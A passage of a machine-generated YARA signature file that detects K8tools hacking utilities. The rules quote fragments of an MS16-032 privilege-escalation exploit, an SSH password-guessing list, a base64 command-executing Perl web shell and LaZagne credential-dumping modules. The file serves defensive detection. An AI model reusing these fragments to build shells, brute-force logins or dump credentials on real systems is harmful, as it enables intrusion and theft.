      $s19 = "yvdKn\\N" fullword ascii /* score: '4.00'*/
      $s20 = "jpPe`38~0" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule Invoke_MS16_032 {
   meta:
      description = "K8tools - file Invoke-MS16-032.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "330b2cbdbbcfe728262bc60596db5adf74fb7418fb879a23b49b1e7a7d271848"
   strings:
      $x1 = "0x00000002, \"C:\\Windows\\System32\\cmd.exe\", \"\"," fullword ascii /* score: '34.00'*/
      $x2 = "# CreateProcessWithLogonW --> lpCurrentDirectory" fullword ascii /* score: '31.00'*/
      $s3 = "echo \"[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)\"" fullword ascii /* score: '29.00'*/
      $s4 = "PowerShell implementation of MS16-032. The exploit targets all vulnerable" fullword ascii /* score: '28.00'*/
      $s5 = "[Kernel32]::GetCurrentProcess()," fullword ascii /* score: '25.00'*/
      $s6 = "IntPtr hTargetProcessHandle," fullword ascii /* score: '25.00'*/
      $s7 = "public static extern IntPtr GetCurrentProcess();" fullword ascii /* score: '23.00'*/
      $s8 = "public static extern int GetProcessIdOfThread(IntPtr handle);" fullword ascii /* score: '23.00'*/
      $s9 = "# Duplicate handle into current process -> DUPLICATE_SAME_ACCESS" fullword ascii /* score: '23.00'*/
      $s10 = "# If we can't open the process token it's a SYSTEM shell!" fullword ascii /* score: '23.00'*/
      $s11 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii /* score: '22.00'*/
      $s12 = "[DllImport(\"kernel32.dll\",SetLastError=true)]" fullword ascii /* score: '22.00'*/
      $s13 = "[DllImport(\"ntdll.dll\", SetLastError=true)]" fullword ascii /* score: '22.00'*/
      $s14 = "[DllImport(\"advapi32.dll\", SetLastError=true, CharSet=CharSet.Unicode)]" fullword ascii /* score: '22.00'*/
      $s15 = "[DllImport(\"advapi32.dll\", SetLastError=true)]" fullword ascii /* score: '22.00'*/
      $s16 = "[DllImport(\"kernel32.dll\", SetLastError=true)]" fullword ascii /* score: '22.00'*/
      $s17 = "Blog: http://www.fuzzysecurity.com/" fullword ascii /* score: '22.00'*/
      $s18 = "public static extern bool OpenProcessToken(" fullword ascii /* score: '21.00'*/
      $s19 = "public static extern bool CreateProcessWithLogonW(" fullword ascii /* score: '21.00'*/
      $s20 = "# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule MS15_051_______CVE_2015_1701_20150525_K8_ {
   meta:
      description = "K8tools - file MS15-051提权 CVE-2015-1701_20150525[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ead289e8684ce58205ac7d924abdcc94af0848a228ccce4677ad95e2e28ebba2"
   strings:
      $s1 = "\\ms15-051_x86.exe" fullword ascii /* score: '17.00'*/
      $s2 = "\\ms15-051_x64.exe" fullword ascii /* score: '17.00'*/
      $s3 = "\\pr0_x64.exe" fullword ascii /* score: '13.00'*/
      $s4 = "\\pr0_x86.exe" fullword ascii /* score: '13.00'*/
      $s5 = "- W8O]M" fullword ascii /* score: '5.00'*/
      $s6 = "CVE-2015-1701\\" fullword ascii /* score: '5.00'*/
      $s7 = "MS15-051" fullword ascii /* score: '5.00'*/
      $s8 = "CVE-2015-1701" fullword ascii /* score: '5.00'*/
      $s9 = "sthgAG_" fullword ascii /* score: '4.00'*/
      $s10 = ".FfM'v" fullword ascii /* score: '4.00'*/
      $s11 = "LftN<Vg" fullword ascii /* score: '4.00'*/
      $s12 = "Jepw}i]H" fullword ascii /* score: '4.00'*/
      $s13 = "\\-;8;>" fullword ascii /* score: '2.00'*/
      $s14 = "\\k8cR\\" fullword ascii /* score: '2.00'*/
      $s15 = "| +R(%" fullword ascii /* score: '1.00'*/
      $s16 = "U#Ex E" fullword ascii /* score: '1.00'*/
      $s17 = "M x5tM5" fullword ascii /* score: '1.00'*/
      $s18 = ":[li:9" fullword ascii /* score: '1.00'*/
      $s19 = "hk-hS4?" fullword ascii /* score: '1.00'*/
      $s20 = "!y$fY&3" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      8 of them
}

rule UPX____________ {
   meta:
      description = "K8tools - file UPX加壳脱壳.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "352112d9dc2e35ccc2ebeb7babea6e9fdd54622bc959ed0e6f83bb27d62784ed"
   strings:
      $s1 = "kernel32.dll_G|" fullword ascii /* score: '16.00'*/
      $s2 = "MTargetJ" fullword ascii /* score: '14.00'*/
      $s3 = "'L3'L3'" fullword ascii /* reversed goodware string ''3L'3L'' */ /* score: '11.00'*/
      $s4 = "~@!%i- " fullword ascii /* score: '10.92'*/
      $s5 = "* {8>n%" fullword ascii /* score: '9.00'*/
      $s6 = "ghijstuvwxyz" fullword ascii /* score: '8.00'*/
      $s7 = "', RUnt=!H " fullword ascii /* score: '7.42'*/
      $s8 = "o.urn:sch&0-microsoft-" fullword ascii /* score: '7.00'*/
      $s9 = "fnTLMi_" fullword ascii /* score: '7.00'*/
      $s10 = "J:\"7DAw" fullword ascii /* score: '7.00'*/
      $s11 = "EASTROPE" fullword ascii /* score: '6.50'*/
      $s12 = "OFKQGMRGNUHPXI" fullword ascii /* score: '6.50'*/
      $s13 = "EXEFILE" fullword wide /* score: '6.50'*/
      $s14 = "RTORCRM" fullword ascii /* score: '6.50'*/
      $s15 = "TURKISHH" fullword ascii /* score: '6.50'*/
      $s16 = "w|Logo" fullword ascii /* score: '6.00'*/
      $s17 = "EMFtPj" fullword ascii /* score: '6.00'*/
      $s18 = "(2 -8%9" fullword ascii /* score: '5.00'*/
      $s19 = "wDEFAULT5" fullword ascii /* score: '5.00'*/
      $s20 = "g- F;X" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "7b892b1607ce5fba9f4f6832a145dca8" or 8 of them )
}

rule ColdFusion_8_LFI_EXP_20160414_K_8_ {
   meta:
      description = "K8tools - file ColdFusion 8 LFI EXP_20160414[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "680524cbadefee31c80f844319b0ba90b895349248fbaf53e50413bc1c3597a3"
   strings:
      $s1 = "ColdFusion 8 LFI EXP.exe" fullword ascii /* score: '19.00'*/
      $s2 = "9hkGm}S:" fullword ascii /* score: '4.00'*/
      $s3 = "HYr9x\\" fullword ascii /* score: '1.00'*/
      $s4 = "tX-VFz-:" fullword ascii /* score: '1.00'*/
      $s5 = "HnOJxQ" fullword ascii /* score: '1.00'*/
      $s6 = "O=t`z\"" fullword ascii /* score: '1.00'*/
      $s7 = "Y~-Y+nj~" fullword ascii /* score: '1.00'*/
      $s8 = "?I%'71" fullword ascii /* score: '1.00'*/
      $s9 = "5P+WiE" fullword ascii /* score: '1.00'*/
      $s10 = "oE O)," fullword ascii /* score: '1.00'*/
      $s11 = "#,=~ *v" fullword ascii /* score: '1.00'*/
      $s12 = ">!Zl%xU^" fullword ascii /* score: '1.00'*/
      $s13 = "T31?eV" fullword ascii /* score: '1.00'*/
      $s14 = "[`C2VMn" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8COOKIE {
   meta:
      description = "K8tools - file K8COOKIE.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0f036dee84d9b1a07ad892708f016847b7bf64dfabd359ee5461ccd35a74a8b9"
   strings:
      $s1 = "V2.0\\K8skin.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "V2.0\\K8CooKie.eXe" fullword ascii /* score: '18.00'*/
      $s3 = "V2.0\\ReadMe.txt" fullword ascii /* score: '14.00'*/
      $s4 = "V2.0\\k8qqkiss.skin" fullword ascii /* score: '4.00'*/
      $s5 = "v!.fun" fullword ascii /* score: '4.00'*/
      $s6 = "r7DkDwLJx`" fullword ascii /* score: '4.00'*/
      $s7 = "IVXZ,$@" fullword ascii /* score: '4.00'*/
      $s8 = "qdlS2b!S" fullword ascii /* score: '4.00'*/
      $s9 = "dnaV\"r" fullword ascii /* score: '4.00'*/
      $s10 = "O.nRZ}" fullword ascii /* score: '4.00'*/
      $s11 = "KNyKKx+]" fullword ascii /* score: '4.00'*/
      $s12 = "K8COOKIE" fullword ascii /* score: '4.00'*/
      $s13 = "LrCx?$\\" fullword ascii /* score: '4.00'*/
      $s14 = "rIOD(#M" fullword ascii /* score: '4.00'*/
      $s15 = "Bihf4b{" fullword ascii /* score: '4.00'*/
      $s16 = "Q*LJbU?E" fullword ascii /* score: '4.00'*/
      $s17 = "lbOlj6" fullword ascii /* score: '2.00'*/
      $s18 = "kRdh04" fullword ascii /* score: '2.00'*/
      $s19 = "txFXs2" fullword ascii /* score: '2.00'*/
      $s20 = "\\x-XfU" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule sshcrack {
   meta:
      description = "K8tools - file sshcrack.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "dde9a96455d1f3211b8d9b16fb2565d2c501167391125722e1987d0f03b004a5"
   strings:
      $s1 = "print host+' '+port+' '+user+' '+pwd+' LoginOK'" fullword ascii /* score: '23.00'*/
      $s2 = "#https://www.cnblogs.com/k8gege" fullword ascii /* score: '22.00'*/
      $s3 = "ssh.connect(host,port,user,pwd)" fullword ascii /* score: '18.00'*/
      $s4 = "#https://github.com/k8gege" fullword ascii /* score: '17.00'*/
      $s5 = "checkSSH(host,port,'root','123456')" fullword ascii /* score: '15.00'*/
      $s6 = "checkSSH(host,port,'root','root2018')" fullword ascii /* score: '15.00'*/
      $s7 = "checkSSH(host,port,'root','toor')" fullword ascii /* score: '15.00'*/
      $s8 = "checkSSH(host,port,'root','Admin123!@#')" fullword ascii /* score: '15.00'*/
      $s9 = "checkSSH(host,port,'root','root123!@#')" fullword ascii /* score: '15.00'*/
      $s10 = "checkSSH(host,port,'root','cisco')" fullword ascii /* score: '15.00'*/
      $s11 = "checkSSH(host,port,'root','Admin123')" fullword ascii /* score: '15.00'*/
      $s12 = "checkSSH(host,port,'root','root2015')" fullword ascii /* score: '15.00'*/
      $s13 = "checkSSH(host,port,'root','Cisco')" fullword ascii /* score: '15.00'*/
      $s14 = "checkSSH(host,port,'root','root2014')" fullword ascii /* score: '15.00'*/
      $s15 = "checkSSH(host,port,'root','root2019')" fullword ascii /* score: '15.00'*/
      $s16 = "checkSSH(host,port,'root','root2012')" fullword ascii /* score: '15.00'*/
      $s17 = "checkSSH(host,port,'root','root2016')" fullword ascii /* score: '15.00'*/
      $s18 = "checkSSH(host,port,'root','system123')" fullword ascii /* score: '15.00'*/
      $s19 = "checkSSH(host,port,'root','root2013')" fullword ascii /* score: '15.00'*/
      $s20 = "checkSSH(host,port,'root','root2017')" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7323 and filesize < 4KB and
      8 of them
}

rule K8tools_LICENSE {
   meta:
      description = "K8tools - file LICENSE"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a7791dbb692c71ef463bba2e3ec3439fb3e05fcc38267ccf28893e1473ace9c7"
   strings:
      $s1 = "copies or substantial portions of the Software." fullword ascii /* score: '7.00'*/
      $s2 = "OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE" fullword ascii /* score: '7.00'*/
      $s3 = "MIT License" fullword ascii /* score: '4.00'*/
      $s4 = "SOFTWARE." fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "The above copyright notice and this permission notice shall be included in all" fullword ascii /* score: '4.00'*/
      $s6 = "Copyright (c) 2019 k8gege" fullword ascii /* score: '4.00'*/
      $s7 = "of this software and associated documentation files (the \"Software\"), to deal" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s8 = "AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s9 = "Permission is hereby granted, free of charge, to any person obtaining a copy" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "copies of the Software, and to permit persons to whom the Software is" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s12 = "LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM," fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "furnished to do so, subject to the following conditions:" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "in the Software without restriction, including without limitation the rights" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY," fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s16 = "THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "to use, copy, modify, merge, publish, distribute, sublicense, and/or sell" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x494d and filesize < 3KB and
      8 of them
}

rule K8FTP_______________V2_0_20190301_K8_ {
   meta:
      description = "K8tools - file K8FTP密码破解器V2.0_20190301[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "74ac4d9c14d1cef244fb5eca0a2de7bf83b718bc22ecae48bd9c113f5a995329"
   strings:
      $s1 = "V2.0\\K8skin.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "V2.0 .exe" fullword ascii /* score: '16.00'*/
      $s3 = "V2.0\\MSINET.OCX" fullword ascii /* score: '7.00'*/
      $s4 = "V2.0\\MSWINSCK.OCX" fullword ascii /* score: '7.00'*/
      $s5 = "Yg:\"si" fullword ascii /* score: '7.00'*/
      $s6 = "48Y.zuC" fullword ascii /* score: '7.00'*/
      $s7 = "Kg:\\]=" fullword ascii /* score: '7.00'*/
      $s8 = "\\herEYE" fullword ascii /* score: '7.00'*/
      $s9 = "V2.0\\[K.8]FTP" fullword ascii /* score: '6.00'*/
      $s10 = "#k!!!V" fullword ascii /* score: '6.00'*/
      $s11 = "k4=(* lZ" fullword ascii /* score: '5.00'*/
      $s12 = "skinSH4" fullword ascii /* score: '5.00'*/
      $s13 = "(@[+ ;" fullword ascii /* score: '5.00'*/
      $s14 = "\\CnYI`bL" fullword ascii /* score: '5.00'*/
      $s15 = "V2.0\\k8qqkiss.skin" fullword ascii /* score: '4.00'*/
      $s16 = "DLME!bI" fullword ascii /* score: '4.00'*/
      $s17 = "SGcEGti" fullword ascii /* score: '4.00'*/
      $s18 = "PknlzlE`" fullword ascii /* score: '4.00'*/
      $s19 = "yEoQh?\"" fullword ascii /* score: '4.00'*/
      $s20 = "QshDZpm" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 800KB and
      8 of them
}

rule CVE_2018_2894_Poc {
   meta:
      description = "K8tools - file CVE-2018-2894_Poc.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "236b7e8a09f6f2d43c1e4ae30e3892d84eb4b74362bee781890c445d370914d7"
   strings:
      $s1 = "LadonPoc.exe" fullword wide /* score: '22.00'*/
      $s2 = "CscanDLL.scan" fullword wide /* score: '13.00'*/
      $s3 = "WeblogicVUL CVE-2018-2894" fullword wide /* score: '13.00'*/
      $s4 = "netscan" fullword ascii /* score: '9.00'*/
      $s5 = "<name>BasicConfigOptions.workDir</name>" fullword wide /* score: '7.00'*/
      $s6 = "HttpPocTest" fullword wide /* score: '7.00'*/
      $s7 = "<PrivateImplementationDetails>{58B42793-2F0D-42B2-B2AF-E35393C78F81}" fullword ascii /* score: '7.00'*/
      $s8 = "v#-E -f" fullword ascii /* score: '5.00'*/
      $s9 = "GZipStream" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 31 times */
      $s10 = "System.IO.Compression" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 51 times */
      $s11 = "Program" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.81'*/ /* Goodware String - occured 194 times */
      $s12 = "MemoryStream" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.58'*/ /* Goodware String - occured 420 times */
      $s13 = "Console" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.47'*/ /* Goodware String - occured 526 times */
      $s14 = "/ws_utc/resources/setting/options/general" fullword wide /* score: '4.00'*/
      $s15 = "kLgV/1N" fullword ascii /* score: '4.00'*/
      $s16 = "LadonPoc" fullword ascii /* score: '4.00'*/
      $s17 = "System.Runtime.CompilerServices" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.05'*/ /* Goodware String - occured 1950 times */
      $s18 = "url is null" fullword wide /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "System.Reflection" fullword ascii /* PEStudio Blacklist: strings */ /* score: '2.81'*/ /* Goodware String - occured 2186 times */
      $s20 = "httpreq" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule K8tools_sshcmd {
   meta:
      description = "K8tools - file sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "bsshcmd.exe.manifest" fullword ascii /* score: '26.00'*/
      $s3 = "opyi-windows-manifest-filename sshcmd.exe.manifest" fullword ascii /* score: '23.00'*/
      $s4 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s5 = "btcl85.dll" fullword ascii /* score: '23.00'*/
      $s6 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s7 = "btk85.dll" fullword ascii /* score: '20.00'*/
      $s8 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s9 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s10 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s11 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s12 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s13 = "b_win32sysloader.pyd" fullword ascii /* score: '16.00'*/
      $s14 = "future.backports.http.cookiejar(" fullword ascii /* score: '16.00'*/
      $s15 = "future.backports.email._encoded_words(" fullword ascii /* score: '15.42'*/
      $s16 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s17 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for Py_BuildValue" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PySys_SetArgvEx" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 28000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule GetPassword_x64 {
   meta:
      description = "K8tools - file GetPassword_x64.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "00745bd68e00a14cc29725dd86a86070d1ca0e0acf8d97882d3636124b94d72e"
   strings:
      $x1 = "GetPassword_x64.exe" fullword ascii /* score: '32.00'*/
      $s2 = "N:\\|p#\"3" fullword ascii /* score: '7.00'*/
      $s3 = "'N:\\P?" fullword ascii /* score: '7.00'*/
      $s4 = "1zzh.pCM" fullword ascii /* score: '7.00'*/
      $s5 = "fiYRxs4" fullword ascii /* score: '5.00'*/
      $s6 = ".cfJ[= " fullword ascii /* score: '4.42'*/
      $s7 = "KBLt*ju" fullword ascii /* score: '4.00'*/
      $s8 = "&gysaH\"K" fullword ascii /* score: '4.00'*/
      $s9 = "bWaI@\"" fullword ascii /* score: '4.00'*/
      $s10 = "PPVn|2n" fullword ascii /* score: '4.00'*/
      $s11 = "EYQsUAe" fullword ascii /* score: '4.00'*/
      $s12 = "ZVzz9't" fullword ascii /* score: '4.00'*/
      $s13 = "vUeAOcU" fullword ascii /* score: '4.00'*/
      $s14 = "WubW%]D" fullword ascii /* score: '4.00'*/
      $s15 = "mTWJ>L]" fullword ascii /* score: '4.00'*/
      $s16 = "UCwp:,S" fullword ascii /* score: '4.00'*/
      $s17 = "XBeJy3B" fullword ascii /* score: '4.00'*/
      $s18 = "[V0nZClB?)3" fullword ascii /* score: '4.00'*/
      $s19 = "XlHz\\H;" fullword ascii /* score: '4.00'*/
      $s20 = "XOSB?J" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule K8tools_k8cmd {
   meta:
      description = "K8tools - file k8cmd.pl"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4947bbf25cfb55f7b91caacab42ea67137cc60395eaa0ac087d04c3ff9ccd5ca"
   strings:
      $s1 = "#!c:/Perl/bin/perl.exe" fullword ascii /* score: '22.00'*/
      $s2 = "{read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});}" fullword ascii /* score: '12.00'*/
      $s3 = "if ($ENV{'REQUEST_METHOD'} eq \"POST\")" fullword ascii /* score: '9.00'*/
      $s4 = "print \"Content-type: text/plain; charset=iso-8859-1\\n\\n\";" fullword ascii /* score: '9.00'*/
      $s5 = "$value =~ s/<!--(.|\\n)*-->//g;" fullword ascii /* score: '9.00'*/
      $s6 = "system(decode_base64($value));" fullword ascii /* score: '9.00'*/
      $s7 = "my $dir = File::Basename::dirname($0);" fullword ascii /* score: '4.17'*/
      $s8 = "($name, $value) = split(/=/, $pair);" fullword ascii /* score: '4.03'*/
      $s9 = "$FORM{$name} = $value if ($name);" fullword ascii /* score: '4.00'*/
      $s10 = "print \"[S]\".$dir.\"[E]\";" fullword ascii /* score: '4.00'*/
      $s11 = "print \"|<-\";" fullword ascii /* score: '4.00'*/
      $s12 = "print \"->|\";" fullword ascii /* score: '4.00'*/
      $s13 = "else {$buffer = $ENV{'QUERY_STRING'};}" fullword ascii /* score: '4.00'*/
      $s14 = "if ($name eq \"tom\") " fullword ascii /* score: '4.00'*/
      $s15 = "if ($value eq \"Szh0ZWFt\") " fullword ascii /* score: '4.00'*/
      $s16 = "@pairs = split(/&/, $buffer);" fullword ascii /* score: '4.00'*/
      $s17 = "$value =~ tr/+/ /;" fullword ascii /* score: '4.00'*/
      $s18 = "use MIME::Base64;  " fullword ascii /* score: '4.00'*/
      $s19 = "$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;" fullword ascii /* score: '4.00'*/
      $s20 = "$value=~ s/\\r\\n/<br>/g;" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule K8tools_k8zzz {
   meta:
      description = "K8tools - file k8zzz.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "3f4249ee82d234c1da9413cb88600201aca27ef5e5d40a4978b1514d82e30842"
   strings:
      $s1 = "zzz_exploit.exe" fullword ascii /* score: '23.00'*/
      $s2 = "sAeN:\\f" fullword ascii /* score: '10.00'*/
      $s3 = "4ZXuI.GCw]W" fullword ascii /* score: '10.00'*/
      $s4 = "* !X4i" fullword ascii /* score: '9.00'*/
      $s5 = ",?=\",21*" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s6 = "k8zzz.png" fullword ascii /* score: '7.00'*/
      $s7 = "yHC:\"JW" fullword ascii /* score: '7.00'*/
      $s8 = "xRn.VxZ[" fullword ascii /* score: '7.00'*/
      $s9 = "rhO:\\7" fullword ascii /* score: '7.00'*/
      $s10 = "3%s:|5 cG" fullword ascii /* score: '6.50'*/
      $s11 = "IrC dC" fullword ascii /* score: '6.00'*/
      $s12 = "Rhfmyua" fullword ascii /* score: '6.00'*/
      $s13 = "=i'LOG" fullword ascii /* score: '6.00'*/
      $s14 = "]iftPJ" fullword ascii /* score: '6.00'*/
      $s15 = "Ftp7c$" fullword ascii /* score: '6.00'*/
      $s16 = "Bf>}ON- " fullword ascii /* score: '5.42'*/
      $s17 = "i-  hh" fullword ascii /* score: '5.42'*/
      $s18 = "l9L`+ " fullword ascii /* score: '5.42'*/
      $s19 = "][W'+ " fullword ascii /* score: '5.42'*/
      $s20 = "- K}*6'Sv" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 15000KB and
      8 of them
}

rule K8tools_laZagne {
   meta:
      description = "K8tools - file laZagne.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "lazagne.config.powershell_execute(" fullword ascii /* score: '24.00'*/
      $s3 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s4 = "bsqlite3.dll" fullword ascii /* score: '23.00'*/
      $s5 = "btcl85.dll" fullword ascii /* score: '23.00'*/
      $s6 = "lazagne.softwares.windows.creddump7.win32.lsasecrets(" fullword ascii /* score: '20.00'*/
      $s7 = "lazagne.softwares.windows.creddump7.win32.hashdump(" fullword ascii /* score: '20.00'*/
      $s8 = "lazagne.softwares.windows.hashdump(" fullword ascii /* score: '20.00'*/
      $s9 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s10 = "btk85.dll" fullword ascii /* score: '20.00'*/
      $s11 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s12 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s13 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s14 = "memorpy.OSXProcess(" fullword ascii /* score: '18.00'*/
      $s15 = "memorpy.BaseProcess(" fullword ascii /* score: '18.00'*/
      $s16 = "memorpy.Process(" fullword ascii /* score: '18.00'*/
      $s17 = "memorpy.LinProcess(" fullword ascii /* score: '18.00'*/
      $s18 = "memorpy.SunProcess(" fullword ascii /* score: '18.00'*/
      $s19 = "memorpy.WinProcess(" fullword ascii /* score: '18.00'*/
      $s20 = "lazagne.softwares.windows.creddump7.addrspace(" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      ( pe.imphash() == "fc40519af20116c903e3ff836e366e39" or 8 of them )
}

rule K8______________________________V2_0 {
   meta:
      description = "K8tools - file K8随机免杀花指令生成器V2.0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "06d1764eb0c4bdbd8a9c768cfdb2a78097df6d8d94a116db3295a7e290cc163e"
   strings:
      $s1 = "2.dll_GetLongPathNameA'" fullword ascii /* score: '18.00'*/
      $s2 = "@@@@@@<" fullword ascii /* reversed goodware string '<@@@@@@' */ /* score: '11.00'*/
      $s3 = "@@@@@<" fullword ascii /* reversed goodware string '<@@@@@' */ /* score: '11.00'*/
      $s4 = "Templa" fullword ascii /* score: '10.00'*/
      $s5 = "* (()@-3$-" fullword ascii /* score: '9.00'*/
      $s6 = "cdefghijstuvwxyz" fullword ascii /* score: '8.00'*/
      $s7 = "ixedcell" fullword ascii /* score: '8.00'*/
      $s8 = "sBin,Apa" fullword ascii /* score: '7.00'*/
      $s9 = "SP_CLOSEDFOLDER" fullword wide /* score: '7.00'*/
      $s10 = "ThreadG" fullword ascii /* score: '7.00'*/
      $s11 = ",keysK<tj" fullword ascii /* score: '7.00'*/
      $s12 = "DGKCHLDHMEIK" fullword ascii /* score: '6.50'*/
      $s13 = "GHIJKLMNOPQRSTUVW" fullword ascii /* score: '6.50'*/
      $s14 = "RCirCd" fullword ascii /* score: '6.00'*/
      $s15 = "- I@AoT" fullword ascii /* score: '5.00'*/
      $s16 = "+ (ify" fullword ascii /* score: '5.00'*/
      $s17 = "F5d* D" fullword ascii /* score: '5.00'*/
      $s18 = "uduudu" fullword ascii /* score: '5.00'*/
      $s19 = "D'g+ t%" fullword ascii /* score: '5.00'*/
      $s20 = "\\%WvvthUa/" fullword ascii /* score: '5.00'*/
   condition:
